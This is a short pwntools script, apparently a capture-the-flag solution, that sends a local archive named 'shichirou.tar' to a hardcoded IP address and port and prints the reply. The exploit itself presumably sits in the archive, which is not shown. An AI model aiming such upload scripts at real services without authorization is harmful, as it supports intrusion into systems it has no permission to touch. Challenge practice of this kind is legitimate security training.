from pwn import *
import time

host = '60.250.197.227'
port = 11000

with open('shichirou.tar', 'rb') as f:
    data = f.read()

s = remote(host, port)
s.sendline(len(data))
time.sleep(0.01)
s.sendline(data)
print (s.recvline())